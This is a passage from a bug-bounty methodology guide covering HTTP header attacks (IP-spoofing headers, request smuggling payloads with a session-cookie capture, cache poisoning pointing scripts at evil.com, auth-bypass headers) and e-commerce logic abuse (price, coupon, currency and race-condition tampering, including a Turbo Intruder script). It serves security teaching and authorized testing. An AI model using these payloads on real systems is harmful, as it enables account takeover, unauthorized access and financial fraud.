Step 1: Baseline (no spoofing)
GET /target-endpoint HTTP/1.1
Host: target.com
→ Note response

Step 2: Try each IP header one at a time:
GET /target-endpoint HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

GET /target-endpoint HTTP/1.1
Host: target.com
X-Real-IP: 127.0.0.1

GET /target-endpoint HTTP/1.1
Host: target.com
X-Client-IP: 127.0.0.1

... (try all headers from the list above)

Step 3: Try multiple headers simultaneously:
GET /target-endpoint HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

Step 4: Try chained X-Forwarded-For:
X-Forwarded-For: 127.0.0.1, 203.0.113.50
→ Some parsers take the FIRST IP, some take the LAST

Step 5: Compare responses to baseline
→ Different status code? (403→200)
→ Different content? (blocked→allowed)
→ Different rate limit behavior?
```

---

## 7. 🚂 Request Smuggling via Headers

The most complex header attack. Also the most impactful — consistently pays $10K+ bounties.

### What Is Request Smuggling?

```
When a frontend (proxy/LB) and backend DISAGREE on where one
request ends and the next begins, an attacker can "smuggle" a
request inside another.

The disagreement comes from TWO headers that define body length:
├── Content-Length: 13       ← "body is 13 bytes"
├── Transfer-Encoding: chunked ← "body uses chunked encoding"

If BOTH are present → which does the server trust?
HTTP spec says Transfer-Encoding takes priority.
But not all servers follow the spec.
```

### The Three Smuggling Types

**Type 1: CL.TE (Frontend uses Content-Length, Backend uses Transfer-Encoding)**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

What happens:
1. Frontend reads Content-Length: 13 → reads "0\r\n\r\nSMUGGLED" (13 bytes)
   → Forwards the entire thing as ONE request

2. Backend reads Transfer-Encoding: chunked → reads chunk size "0"
   → 0 = end of chunks → First request is done!
   → "SMUGGLED" is left in the buffer → treated as START of NEXT request!

Result: "SMUGGLED" gets prepended to the next user's request!
```

**Type 2: TE.CL (Frontend uses Transfer-Encoding, Backend uses Content-Length)**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

What happens:
1. Frontend reads Transfer-Encoding: chunked → reads chunks until "0"
   → Forwards everything as ONE request

2. Backend reads Content-Length: 3 → reads only "8\r\n" (3 bytes)
   → "SMUGGLED\r\n0\r\n" is left in buffer → next request!
```

**Type 3: TE.TE (Both use Transfer-Encoding, but with obfuscation)**
```
One server processes Transfer-Encoding, the other doesn't
because the header is slightly malformed:

Transfer-Encoding: chunked
Transfer-Encoding: cow               ← invalid, some servers ignore
Transfer-Encoding : chunked          ← space before colon
Transfer-Encoding: chunked
Transfer-encoding: x                 ← lowercase 'e'
Transfer-Encoding:chunked            ← no space after colon
Transfer-Encoding: xchunked          ← prefix
Transfer-Encoding: chunked\r\n\t     ← trailing whitespace
X: x\r\nTransfer-Encoding: chunked   ← header injection
```

### Real Smuggling Attack: Capture Another User's Request

```
POST / HTTP/1.1
Host: target.com
Content-Length: 70
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Length: 200
Cookie: 

What happens:
1. Smuggled request "POST /log" is prepended to next user's request
2. Next user's request gets APPENDED to Content-Length: 200 body
3. The /log endpoint stores the body → contains victim's cookies!

Victim sends:
GET /home HTTP/1.1
Host: target.com
Cookie: session=VICTIM_SECRET_TOKEN

Backend sees:
POST /log HTTP/1.1
Host: target.com
Content-Length: 200
Cookie: GET /home HTTP/1.1
Host: target.com
Cookie: session=VICTIM_SECRET_TOKEN

→ Attacker reads /log → gets victim's session cookie → ATO!
```

### Smuggling Detection (Practical)

```
Use Burp Suite's HTTP Request Smuggler extension:
1. Install from BApp Store → "HTTP Request Smuggler"
2. Right-click on any request → Extensions → HTTP Request Smuggler → Smuggle Probe
3. Extension automatically tests CL.TE, TE.CL, and TE.TE

Manual timing-based detection:

CL.TE test (should cause timeout):
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q

If frontend uses CL: reads 4 bytes ("1\r\nZ") → forwards
If backend uses TE: reads chunk "1" → reads "Z" → waits for next chunk → TIMEOUT!
Timeout = CL.TE confirmed!

TE.CL test (should cause timeout):
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X

If frontend uses TE: reads chunks, hits "0" → done → forwards
If backend uses CL: reads 6 bytes → wants more → TIMEOUT!
Timeout = TE.CL confirmed!
```

### Smuggling Impact

```
┌───────────────────────────────┬──────────┬─────────────────────┐
│ Attack                        │ Severity │ What You Can Do      │
├───────────────────────────────┼──────────┼─────────────────────┤
│ Capture other users' requests │ Critical │ Steal sessions/creds │
│ Bypass frontend access control│ Critical │ Access restricted EP │
│ Cache poisoning via smuggling │ Critical │ XSS for all users    │
│ Redirect other users          │ High     │ Phishing/MITM        │
│ Bypass WAF rules              │ High     │ Smuggle XSS/SQLi     │
│ Request hijacking             │ Critical │ Intercept API calls   │
└───────────────────────────────┴──────────┴─────────────────────┘

Bounty range: $5,000 — $50,000+
Request smuggling is one of the highest-paying bug classes.
```

---

## 8. 💀 Cache Poisoning via Headers

Make the CDN/cache serve your malicious content to EVERY visitor.

### How Web Caching Works

```
Without cache:
User A → Server → Response A (generated fresh)
User B → Server → Response B (generated fresh)
User C → Server → Response C (generated fresh)
= 3 server-side computations

With cache:
User A → Cache (miss) → Server → Response → Cached!
User B → Cache (hit!) → Returns cached response
User C → Cache (hit!) → Returns cached response
= 1 server-side computation, 2 served from cache

Cache KEY (what determines if cached response is reused):
Usually: Method + URL + Host header + some query params
Does NOT include: most other headers!

THE VULNERABILITY:
If a header CHANGES the response but is NOT in the cache key,
an attacker can poison the cache for everyone!

These are called "unkeyed inputs."
```

### Attack: Cache Poisoning via X-Forwarded-Host

```
Normal request:
GET /home HTTP/1.1
Host: target.com

Response:
<html>
<script src="https://target.com/static/app.js"></script>
</html>
→ Cache stores this for cache key: GET /home target.com

Attacker's request:
GET /home HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

Response (if server uses X-Forwarded-Host for asset URLs):
<html>
<script src="https://evil.com/static/app.js"></script>    ← POISONED!
</html>
→ Cache stores this for cache key: GET /home target.com
   (X-Forwarded-Host is NOT in the cache key!)

All subsequent visitors to /home get:
<script src="https://evil.com/static/app.js"></script>
→ Attacker's JavaScript loaded for EVERYONE!
→ Mass XSS / account takeover
```

### Finding Unkeyed Inputs

```
Use Burp's Param Miner extension:
1. Install "Param Miner" from BApp Store
2. Right-click request → Extensions → Param Miner → Guess Headers
3. It automatically tests dozens of headers to find unkeyed inputs

Manual testing:
1. Send request with a unique marker in a header:
   X-Forwarded-Host: canary123.burpcollaborator.net
2. Check if the response contains "canary123"
3. If yes → the header is reflected
4. Send the SAME request without the header
5. Check the response → if it still has "canary123" → CACHED! → Poisoned!

Headers to test as unkeyed inputs:
X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-Proto,
X-Original-URL, X-Rewrite-URL, X-Host, X-Forwarded-Server,
Origin, X-Forwarded-Port, X-HTTP-Method-Override,
X-Amz-Website-Location-Redirect, Fastly-SSL
```

### Web Cache Deception (The Reverse)

```
Cache Poisoning: Attacker poisons cache → victims get malicious content
Cache Deception:  Attacker tricks cache into STORING victim's private page

Attack:
1. Victim's account page: target.com/account (returns personalized data)
2. Attacker sends victim a link: target.com/account/anything.css

3. If the backend ignores the file extension and returns /account:
   → Response: victim's account details (name, email, etc.)
   
4. If the cache sees .css extension and caches it:
   → Cached: victim's private data at /account/anything.css

5. Attacker visits: target.com/account/anything.css
   → Gets victim's cached account data!

Requirements:
→ Backend returns same content regardless of path suffix
→ Cache caches based on file extension (.css, .js, .png)
→ Victim must visit the crafted URL while authenticated
```

---

## 9. 🔑 Header-Based Authentication Bypass

Use headers that reverse proxies and backends interpret differently.

### X-Original-URL / X-Rewrite-URL Bypass

```
Some reverse proxies (IIS, nginx with certain configs) support:
X-Original-URL: /admin
X-Rewrite-URL: /admin

These OVERRIDE the actual URL path:

Request:
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

The frontend sees: GET /
→ No access control on / → allows through

The backend sees: X-Original-URL: /admin
→ Routes to /admin handler!
→ ACCESS CONTROL BYPASSED!

Test:
1. Visit /admin → 403 Forbidden
2. Visit / with X-Original-URL: /admin → 200?!
3. Visit / with X-Rewrite-URL: /admin → 200?!
```

### Method Override Headers

```
Some frameworks allow overriding the HTTP method via headers:

X-HTTP-Method: PUT
X-HTTP-Method-Override: PUT
X-Method-Override: PUT

Attack:
GET /api/admin/users/delete/123 is blocked by WAF (DELETE only internal)
→ But what if we override method?

POST /api/admin/users/123 HTTP/1.1
X-HTTP-Method-Override: DELETE
→ Backend processes it as DELETE → user deleted!

Or bypass method-specific access controls:
→ POST /admin required auth
→ GET /admin doesn't?
→ POST /admin with X-HTTP-Method-Override: GET → bypass!
```

### X-Custom-IP-Authorization

```
Some internal systems use custom headers for auth between microservices:

X-Internal-Auth: true
X-Service-Name: payment-service
X-Debug: 1
X-Admin: true
X-Bypass-Auth: true

These are meant to be set by internal services only.
But if the proxy doesn't strip them → attacker can set them!

Test by adding these to every request:
X-Internal: true
X-Debug: 1
X-Admin: true
X-Backend-Auth: true
X-Gateway-Auth: true
Internal: true
Admin: true

Use Param Miner to discover which custom headers the app checks.
```

---

## 10. 🎯 HTTP Header Hunting Methodology

### The Complete Process

```
Phase 1: RECONNAISSANCE (5 minutes)
├── curl -sI https://target.com → Check all response headers
├── Check securityheaders.com for target
├── Map all endpoints (Burp Sitemap)
└── Note: What proxy/CDN is in front? (Cloudflare, AWS ALB, nginx?)

Phase 2: SECURITY HEADER AUDIT (10 minutes)
├── Missing CSP? → Can you find XSS to exploit?
├── Missing X-Frame-Options? → Clickjacking PoC
├── Missing HSTS? → SSL strip scenario
├── CORS misconfiguration? → Origin reflection test
├── Weak CSP? → unsafe-inline, wildcard domains?
└── Note: Missing headers alone are often NOT accepted — need impact

Phase 3: CRLF / HEADER INJECTION (15 minutes)
├── Find all redirect endpoints → Test %0d%0a in URL param
├── Find all cookie-setting endpoints → Test %0d%0a in params
├── Test all encoding variants (double, unicode, etc.)
└── If CRLF works → Escalate to response splitting → XSS

Phase 4: X-FORWARDED-FOR / IP SPOOFING (10 minutes)
├── Find rate-limited endpoints → Test IP header spoofing
├── Find IP-restricted endpoints (/admin, /internal)
├── Test ALL IP headers (15+ variations)
├── Test 127.0.0.1, 10.0.0.1, 192.168.1.1, ::1
└── Check if rate limit resets with different X-Forwarded-For

Phase 5: HOP-BY-HOP ABUSE (10 minutes)
├── For each authenticated endpoint:
│   Connection: close, Authorization
│   Connection: close, Cookie
│   Connection: close, X-Auth-Token
└── Check if response changes (auth bypass)

Phase 6: HOST HEADER TESTING (covered in Part C)
├── Duplicate Host header
├── X-Forwarded-Host override
├── Host with port: target.com:evil
└── Password reset poisoning

Phase 7: CACHE POISONING (15 minutes)
├── Run Param Miner → Guess unkeyed headers
├── Test X-Forwarded-Host reflection → check cache behavior
├── Test cache deception (path confusion)
└── Check Vary header (determines what's in cache key)

Phase 8: REQUEST SMUGGLING (20 minutes)
├── Run HTTP Request Smuggler extension
├── Manual CL.TE timing test
├── Manual TE.CL timing test
├── Test TE obfuscation variants
└── If confirmed → demonstrate impact (session capture, cache poison)
```

### Burp Suite Extensions for Header Hunting

```
MUST HAVE:
1. Param Miner → discovers hidden headers, cache poisoning
2. HTTP Request Smuggler → automated smuggling detection
3. Logger++ → log all headers for analysis
4. Backslash Powered Scanner → finds header injection points
5. Active Scan++ → enhanced scanning for header issues

OPTIONAL:
6. J2EEScan → Java-specific header attacks
7. CORS* → automated CORS misconfiguration testing
8. CSP Auditor → analyses CSP weaknesses
```

---

<!-- ═══════════════════════════════════════════════════════════════ -->
<!--           PART B: PRICE / BUSINESS LOGIC MANIPULATION           -->
<!-- ═══════════════════════════════════════════════════════════════ -->

# PART B — 🟡 Price / Business Logic Manipulation

---

## 11. 🧠 What Is Business Logic Manipulation?

### The Concept

```
Technical vulnerabilities: The CODE does something WRONG
  → SQL Injection: code doesn't sanitize input
  → XSS: code doesn't escape output
  → SSRF: code fetches arbitrary URLs

Business Logic vulnerabilities: The CODE works PERFECTLY, 
  but the LOGIC is WRONG
  → Price is validated client-side but not server-side
  → Coupons can be stacked when they shouldn't be
  → You can skip steps in a multi-step checkout
  → Quantity of -1 gives you a refund instead of a charge

There's no WAF signature for "bought a $1000 laptop for $0.01"
There's no scanner that detects "used a referral code on your own account"
These bugs require HUMAN CREATIVITY to find.
```

### Why Logic Flaws Exist

```
1. ASSUMPTION: "The frontend enforces the rules"
   → Developer hardcodes price in the frontend
   → Backend just processes whatever it receives
   → Attacker intercepts and changes the price

2. ASSUMPTION: "Users will follow the intended flow"
   → Step 1: Add to cart → Step 2: Apply coupon → Step 3: Pay
   → What if user goes Step 1 → Step 3 (skip coupon validation)?
   → What if user goes Step 3 → Step 1 (pay before price is set)?

3. ASSUMPTION: "This value can't be negative"
   → quantity: -1 → subtotal = -$50 → discount of $50!
   → price: -100 → you get CREDITED instead of charged

4. ASSUMPTION: "One coupon per order"
   → Code checks: has_coupon_been_applied? 
   → But doesn't check: has ANOTHER coupon been applied?
   → Stack 10 coupons → 100% off

5. ASSUMPTION: "Currency conversion is handled correctly"
   → Buy in cheap currency → system converts wrong → save money
   → Rounding: 3 items at $3.33 = $9.99 → rounds to $9 → free penny
```

### The Bug Bounty Perspective

```
Business logic bugs are GOLD for bounty hunters because:

1. SCANNERS CAN'T FIND THEM
   → No automated tool finds "you can buy premium for free"
   → Only manual testing + creative thinking

2. HIGH IMPACT
   → Direct financial loss to the company
   → "I bought your product for $0" gets attention

3. LESS COMPETITION
   → Most hunters run automated scans
   → Logic bugs require understanding the business
   → Fewer reports → faster response → higher bounties

4. HARD TO DISMISS
   → Company can't say "this is by design"
   → "Unlimited free premium accounts" is clearly a bug

Typical bounties:
├── Price manipulation: $500 - $15,000
├── Subscription bypass: $1,000 - $10,000
├── Coupon abuse: $200 - $5,000
├── Free premium features: $500 - $10,000
└── Payment bypass: $2,000 - $25,000
```

---

## 12. 💰 Price Manipulation Fundamentals

### Where Prices Live (The Kill Chain)

```
Every e-commerce transaction has this data flow:

Product Page → Add to Cart → Cart Page → Checkout → Payment → Confirmation

At each step, the PRICE can be stored/transmitted in:

1. Frontend JavaScript variable
   const price = 99.99;  // ← Editable in browser console

2. Hidden HTML form field
   <input type="hidden" name="price" value="9999">  // ← Editable

3. URL parameter
   /checkout?item=laptop&price=999.99  // ← Editable

4. Cookie
   Set-Cookie: cart={"item":"laptop","price":999.99}  // ← Editable

5. API request body
   POST /api/cart/add {"product_id": 1, "price": 999.99}  // ← Editable

6. Session (server-side) ← HARDEST to manipulate
   → Price stored in server session → not directly editable
   → But: can you change what's IN the session?

7. Database ← CANNOT be directly edited
   → But: what if the database lookup can be bypassed?

YOUR JOB: Find which step trusts client input for the price.
```

### The Cardinal Rules of Price Manipulation Testing

```
Rule 1: ALWAYS intercept with Burp
→ Never test in the browser alone
→ The browser shows you what the DEVELOPER wants you to see
→ Burp shows you what's actually being SENT

Rule 2: Test at EVERY step of the flow
→ Don't just test checkout
→ Test: add to cart, update quantity, apply coupon, 
   select shipping, enter payment, confirm order

Rule 3: Look for the PRICE in every request
→ Search for the dollar amount in request body
→ Search in query parameters
→ Search in cookies
→ Search in hidden fields
→ Search in JSON payloads

Rule 4: Change the price AND check if it sticks
→ Sometimes you can change it in the request but 
   the server recalculates → not vulnerable
→ Always verify: Was the FINAL charge actually different?

Rule 5: Test edge cases
→ 0, -1, 0.01, 0.001, 99999999, null, empty, NaN
→ Different currencies
→ Scientific notation: 1e-10
→ Overflow: 2147483648 (int overflow)
```

---

## 13. 🎰 Types of Price Manipulation

### Type 1: Direct Price Parameter Tampering

```
The simplest attack. Price is sent as a parameter.

Original request:
POST /api/cart/add HTTP/1.1
{"product_id": 42, "quantity": 1, "price": 999.99}

Attack — Change price:
POST /api/cart/add HTTP/1.1
{"product_id": 42, "quantity": 1, "price": 0.01}

Attack — Zero price:
{"product_id": 42, "quantity": 1, "price": 0}

Attack — Negative price (credit):
{"product_id": 42, "quantity": 1, "price": -999.99}
→ If processed: company OWES you $999.99!

Where to test:
→ Add to cart request
→ Update cart request
→ Checkout/payment request
→ Subscription selection request
```

### Type 2: Quantity Manipulation

```
Even if price is server-side, quantity might not be validated:

Normal: quantity=1, price=$100 → total=$100
Attack: quantity=0 → total=$0 (but item still in cart?)
Attack: quantity=-1 → total=-$100 (credit?)
Attack: quantity=0.001 → total=$0.10 (fractional quantity)
Attack: quantity=99999999 → integer overflow → small number?

Example:
POST /api/cart/update HTTP/1.1
{"cart_item_id": 15, "quantity": -1}

If server calculates: total = price × quantity = $100 × -1 = -$100
And adds this to the cart total → discount!
```

### Type 3: Currency Manipulation

```
If the site supports multiple currencies:

Normal flow: USD cart → USD payment ($100)
Attack: USD cart → change currency to IDR → pay in IDR (far less value)

POST /api/checkout HTTP/1.1
{"cart_id": "abc", "currency": "IDR"}

$100 USD = ~1,580,000 IDR
If server charges 100 IDR instead of recalculating → pay $0.006!

Also test:
→ Change currency mid-checkout
→ Use currency code that doesn't exist
→ Mix currencies in multi-item cart
→ Exploit conversion rounding
```

### Type 4: Coupon/Discount Code Stacking

```
Apply multiple coupons when only one should be allowed:

Request 1: POST /api/apply-coupon → {"code": "SAVE10"}  → 10% off
Request 2: POST /api/apply-coupon → {"code": "SAVE10"}  → Another 10%?
Request 3: POST /api/apply-coupon → {"code": "SAVE10"}  → Another 10%?
... repeat 10 times → 100% off!

Or stack DIFFERENT coupons:
{"code": "SAVE10"}     → 10% off
{"code": "WELCOME20"}  → 20% off (intended: only for new users)
{"code": "HOLIDAY15"}  → 15% off
Total: 45% off (intended: max 20%)

Race condition stacking:
→ Send 10 identical coupon requests SIMULTANEOUSLY
→ Server processes them in parallel
→ Each checks "has coupon been applied?" → No! (it hasn't yet)
→ All 10 apply → 100% discount
```

### Type 5: Shipping Cost Manipulation

```
Change shipping method/cost after it's calculated:

Step 1: Select expensive item ($500)
Step 2: Select free shipping (standard)  → Total: $500
Step 3: Intercept and change to premium → Total should be $525
Step 4: What if you change shipping cost to negative?

POST /api/checkout/shipping HTTP/1.1
{"method": "standard", "cost": -500.00}
→ Total: $500 + (-$500) = $0!

Or set shipping to a different value:
{"method": "express", "cost": 0.00}
→ Free express shipping!
```

### Type 6: Product ID Swap (Bait and Switch)

```
Add cheap item to cart, then swap product_id to expensive item:

Step 1: Add $5 sticker to cart
POST /api/cart/add {"product_id": 101, "price": 5.00}

Step 2: At checkout, change product_id to MacBook:
POST /api/checkout {"cart_item_id": 15, "product_id": 999}
→ Server charges $5 (sticker price) but ships MacBook (product 999)?

This works when:
→ Price is stored in cart, not looked up from product catalog
→ Product ID is changeable at checkout
→ Server doesn't re-verify price matches product
```

### Type 7: Gift Card / Store Credit Abuse

```
Attack 1: Buy gift card with gift card (infinite money)
1. Buy $100 gift card using $100 store credit
2. Redeem the new $100 gift card → get $100 store credit
3. Repeat → infinite money!

Attack 2: Negative gift card amount
POST /api/gift-card/purchase
{"amount": -100, "recipient": "self"}
→ "Purchasing" a -$100 gift card → credits $100 to account?

Attack 3: Gift card applied multiple times
POST /api/apply-giftcard {"code": "GIFT100"} → -$100
POST /api/apply-giftcard {"code": "GIFT100"} → -$100 again?
→ $200 off from a $100 gift card!

Attack 4: Partial refund loop
1. Buy item for $100 using gift card
2. Request refund → refund goes to gift card → $100 back
3. Before refund processes, buy another item → charged $0 (refund pending)
4. Refund completes → $100 gift card + item!
```

### Type 8: Trial / Subscription Manipulation

```
Attack 1: Extend trial indefinitely
POST /api/subscription/start-trial
{"plan": "premium", "trial_days": 14}
→ Change to: {"plan": "premium", "trial_days": 99999}

Attack 2: Downgrade but keep premium features
1. Subscribe to Premium ($49/mo)
2. Downgrade to Free via API
3. Check: are premium features still active?
→ Sometimes feature flags don't update immediately

Attack 3: Modify plan price
POST /api/subscription/subscribe
{"plan_id": "premium", "price": 0.01}
→ Premium plan for $0.01/month!

Attack 4: Plan ID swap
1. Select Free plan in UI
2. Intercept request, change plan_id to premium
POST /api/subscription/subscribe
{"plan_id": "premium_annual", "price": 0}
→ Free plan price + premium plan features!
```

### Type 9: Race Condition in Payments

```
The most elegant logic bug. Send multiple requests simultaneously.

Scenario: Account has $100 balance

Normal: Buy $100 item → balance check passes → balance = $0
Double-spend:
→ Send TWO purchase requests at the EXACT same time
→ Both check balance: $100 ≥ $100 → Both pass!
→ Both deduct $100 → balance = -$100
→ But you got TWO items for the price of one!

How to test (using Burp Turbo Intruder):
1. Capture the purchase request
2. Send to Turbo Intruder
3. Use the race condition template
4. Fire 10-20 requests simultaneously
5. Check: did more than one succeed?

python code for Turbo Intruder:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)
```

### Type 10: Tax / Fee Manipulation

```
If tax or fees are calculated client-side and sent to server:

POST /api/checkout HTTP/1.1
{
    "subtotal": 100.00,
    "tax": 8.50,         ← Change to 0
    "shipping": 5.99,    ← Change to 0
    "handling_fee": 2.50, ← Change to 0
    "total": 116.99       ← Change to 100.00 (or 0.01)
}

If the server trusts the "total" field → pay $0.01!
If the server recalculates from subtotal → still try setting tax to 0
```

### Type 11: Rounding Exploitation

```
Buy 3 items at $3.333333:
→ Each rounds to $3.33
→ Total: $9.99
→ But 3 × $3.333333 = $10.00
→ You save $0.01 per order

Scale it up:
→ Buy 3 million items at $3.333333
→ Save $10,000 in rounding errors

Or exploit currency conversion rounding:
→ $1.00 USD = 0.92 EUR (actual: 0.919)
→ Convert $100 → 92 EUR
→ Convert 92 EUR → $100.09 USD (rounding up)
→ Repeat 10,000 times → profit!
```

### Type 12: Referral / Reward Abuse

```
Attack 1: Self-referral
→ Create account A, get referral link
→ Create account B using A's referral link
→ Both accounts get bonus!
→ Repeat with accounts C, D, E...

Attack 2: Referral code manipulation
POST /api/redeem-referral {"code": "REF123", "reward": 10}
→ Change to: {"code": "REF123", "reward": 1000}

Attack 3: Reward point tampering
POST /api/points/redeem {"points": 100, "value": 1.00}
→ Change to: {"points": 1, "value": 1000.00}
```

---

## 14. 🎟️ Coupon & Discount Abuse

### Deep Dive: Every Coupon Attack

**Attack 1: Coupon Code Brute Force**
```
Coupons often follow predictable patterns:

SAVE10, SAVE20, SAVE30, SAVE40, SAVE50
WELCOME10, WELCOME20, WELCOME50
BF2026, CM2026, NY2026 (seasonal)
FRIEND-XXXX (4-digit code)

Brute force with Burp Intruder:
POST /api/apply-coupon
{"code": "§SAVE10§"}

Payload: Numbers list → SAVE1 through SAVE99
Or: Common coupon wordlist (Google "coupon code wordlists")

If rate limiting exists → bypass with X-Forwarded-For rotation
```

**Attack 2: Expired Coupon Resurrection**
```
The coupon "SUMMER2025" expired in 2025. But:
1. Does the server check expiry?
2. What if you change the date parameter?

POST /api/apply-coupon
{"code": "SUMMER2025", "timestamp": "2025-07-15T00:00:00Z"}

Or modify the request date:
Date: Sat, 15 Jul 2025 00:00:00 GMT

Or use a cached/old version of the checkout page that had the coupon embedded
```

**Attack 3: Coupon + Coupon Race Condition**
```
Apply the same coupon simultaneously:

Thread 1: POST /api/apply-coupon {"code": "50OFF"} 
Thread 2: POST /api/apply-coupon {"code": "50OFF"}
Thread 3: POST /api/apply-coupon {"code": "50OFF"}

All at the same millisecond (Turbo Intruder):
→ Server checks: "has 50OFF been applied?" → No! (not yet)
→ All three apply → 50% × 3 = 150% off → they PAY you!
```

**Attack 4: Case Sensitivity / Encoding Bypass**
```
If "SAVE10" has been used and can't be reused:

Try:
save10          ← lowercase
Save10          ← mixed case
SAVE10          ← full width unicode
%53%41%56%45%31%30  ← URL encoded
SAVE10 (with trailing space)
SAVE10\t        ← with tab
SAVE10\n        ← with newline
 SAVE10         ← with leading space

Some backends normalize inconsistently → allows reuse!
```

**Attack 5: Partner/Employee Discount Codes**
```
Companies often have internal discount codes:
EMPLOYEE50, INTERNAL100, PARTNER30, VIP, STAFF, DEBUG, TEST

Techniques to discover:
→ JavaScript source code analysis (search for "coupon", "discount", "promo")
→ GitHub/GitLab repositories (search company name + "coupon code")
→ Wayback Machine (old pages may list codes)
→ API endpoint enumeration: GET /api/coupons → returns all codes?
→ Error messages: "Invalid coupon" vs "Coupon not found" → enum possible
```

---

## 15. 💱 Currency & Rounding Exploits

### Float Precision Attacks

```
Computers store decimals in IEEE 754 floating point. This causes:

0.1 + 0.2 = 0.30000000000000004  (not 0.3!)

Exploit:
If server uses floating point for money calculations:

Item: $19.99
Tax: 8.25%
Expected: $19.99 × 1.0825 = $21.6391... → rounds to $21.64

But float math:
$19.99 × 1.0825 = $21.639175... 
Different rounding methods:
→ Round down: $21.63 (you save $0.01)
→ Round half-up: $21.64
→ Banker's rounding: $21.64
→ Truncate: $21.63

Over millions of transactions, pennies add up to millions.
```

### Currency Conversion Arbitrage

```
Scenario: Site supports USD and EUR

Buy in USD:
Item costs $100.00

Switch to EUR at checkout:
$100.00 × 0.92 = €92.00

But if the site uses a CACHED exchange rate that's different 
from the payment processor's rate:

Site thinks: €92.00
Payment processor charges: €91.50 (different rate)
→ Save €0.50 per transaction

Or: triangular arbitrage
$100 → €92 → £79 → $101 → repeat
Each conversion has rounding in your favor.
```

### Rounding Attack — The Penny Shaving

```
Classic: "Office Space" / "Superman III" attack

If rounding discards fractions less than $0.005:

Buy 1 item at $0.004 → rounds to $0.00 → FREE!
Buy 1000 items at $0.004 each → all round to $0.00 → FREE!

Or accumulate:
$0.004 per unit × 1,000,000 units = $4,000 in underpayments!

Test:
POST /api/cart/add
{"product_id": 1, "quantity": 1, "price": 0.004}
→ Does it round to $0.00?
→ Can you complete checkout for $0.00?
```

---

## 16. 🛒 Cart & Checkout Flow Attacks

### Step-Skipping Attacks

```
Normal checkout flow:
Step 1: POST /cart/add → Add items
Step 2: POST /cart/shipping → Select shipping
Step 3: POST /cart/payment → Enter payment
Step 4: POST /cart/review → Review order
Step 5: POST /cart/confirm → Place order

Attack: Skip directly to Step 5
→ What if you call POST /cart/confirm without Steps 2-4?
→ Price might be $0 (shipping not calculated)
→ Payment might be skipped (payment step not reached)

Attack: Go backwards
→ After Step 4 (price finalized), go back to Step 1
→ Add MORE items to cart
→ Skip to Step 5 → original price for MORE items!

Attack: Repeat a step
→ Complete Steps 1-4 normally
→ Go back to Step 2 → change to free shipping
→ Step 5 → cheaper total!
```

### Parameter Pollution in Checkout

```
Send duplicate parameters with different values:

POST /api/checkout HTTP/1.1
product_id=1&product_id=999&price=5.00&price=999.99

Which value does the server use?
→ First occurrence → product_id=1, price=5.00 → cheap item, cheap price
→ Last occurrence → product_id=999, price=999.99 → expensive item, full price
→ Array → product_id=[1,999] → might break or give both items

Test:
→ price=0.01&price=999.99 (server uses first? → pay $0.01!)
→ total=0.01&total=999.99 (server uses first? → pay $0.01!)
```

### Cart Manipulation Between Users

```
If cart IDs are sequential or predictable:

Your cart: /api/cart/1001
Other user: /api/cart/1002

Attack:
POST /api/cart/1002/checkout HTTP/1.1
Cookie: your_session_cookie
→ Can you checkout someone else's cart?
→ Can you add items to someone else's cart?
→ Can you apply YOUR coupon to THEIR cart?

This is IDOR + business logic combined.
```

---

## 17. 💳 Subscription & Billing Manipulation

### Trial Abuse

```
Attack 1: Infinite trial reset
→ Create account → start free trial → trial expires
→ Delete account → create new account with same email → new trial!
→ If that's blocked → try email+1@gmail.com, email+2@gmail.com

Attack 2: Trial extension via API
POST /api/subscription/extend-trial
{"days": 14} → Change to {"days": 99999}

Attack 3: Trial → Paid → Refund → Keep features
1. Start free trial
2. "Upgrade" to paid during trial
3. Immediately request refund
4. Check: are features still active?
   → Sometimes the feature flag stays "premium" after refund

Attack 4: Clock manipulation
If trial checks client-reported time:
POST /api/subscription/check-trial
{"current_time": "2025-01-01T00:00:00Z"}  ← In the past → trial "just started"
```

### Plan Downgrade Exploitation

```
Upgrade: Free → Pro ($20/mo) → Enterprise ($100/mo)

Attack 1: Downgrade but keep features
1. Subscribe to Enterprise → get features A, B, C, D, E
2. Downgrade to Free via API: PUT /api/subscription {"plan": "free"}
3. Check each feature: A still works? B still works?
→ Often: backend disables new features but forgets existing ones

Attack 2: Partial plan access
1. During upgrade flow, change plan_id in request:
POST /api/subscribe
{"plan_id": "enterprise", "price": "free_plan_price_0"}
→ Enterprise features at free plan price!

Attack 3: Seat manipulation
POST /api/team/update
{"plan": "team_5", "seats": 500}
→ Team plan for 5 users → change to 500 seats at same price!
```

---

## 18. 📊 Real-World Price Manipulation Case Studies

### Case 1: Starbucks — Negative Balance Gift Card ($4,000)

```
Platform: Starbucks
Hunter: @egor_homakov
Bounty: $4,000

Discovery:
→ Starbucks app allowed transferring balance between gift cards
→ Transfer -$100 from Card A to Card B
→ Card A: +$100 (gained money!)
→ Card B: -$100 (negative balance)
→ Repeat with multiple cards → infinite money!

Root cause: No validation on negative transfer amounts
```

### Case 2: Shopify — Price Manipulation in Draft Orders ($5,000)

```
Platform: Shopify
Bounty: $5,000

Discovery:
→ Shopify's draft order API allowed merchants to create orders
→ The price field was editable in the API request
→ A malicious merchant could create orders with $0.01 prices
→ Then mark them as "paid" without actual payment
→ Inventory was deducted as if a real sale occurred

Root cause: Draft order API didn't enforce product catalog prices
```

### Case 3: Uber — Free Rides via Promo Stacking ($3,000)

```
Platform: Uber
Bounty: $3,000

Discovery:
→ Multiple promotional codes could be applied simultaneously
→ Each promo gave $10 off
